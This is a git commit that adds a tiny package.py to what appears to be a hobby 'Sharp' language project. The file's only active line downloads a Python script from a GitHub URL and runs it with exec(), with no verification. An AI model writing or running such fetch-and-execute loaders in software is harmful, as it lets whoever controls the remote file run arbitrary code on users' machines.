f066a6bd2150d23fed3f1057e2ca2c411ebafdee
Fries-Byte <69freshfrenchfries@gmail.com>
2025-02-19 09:28:56 +0100

    Create package.py

---
+++ package.py
@@ -0,0 +1,5 @@
+[ """Package""" ]
+import urllib.request
+exec(urllib.request.urlopen("https://raw.githubusercontent.com/Fries-byte/Sharp/refs/heads/main/runtime/runtime-sharp.py").read().decode())
+
+[ """DECODED""" ]
